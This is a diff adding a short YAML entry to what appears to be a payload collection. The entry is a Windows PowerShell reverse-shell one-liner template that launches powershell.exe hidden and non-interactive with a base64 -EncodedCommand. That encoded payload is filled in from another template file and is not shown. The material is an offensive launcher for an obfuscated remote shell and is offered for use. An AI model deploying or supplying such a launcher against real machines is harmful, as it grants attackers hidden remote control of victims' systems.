@@ -1,0 +1,8 @@
+metadata:
+  filename: "revshell-windows-powershell-oneliner-base64encoded.yaml"
+  tags: ["shell", "windows"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand <% echo $(esh payloads/revshell-windows-powershell-oneliner) | python helper_scripts/encode.py --base64pwsh %>
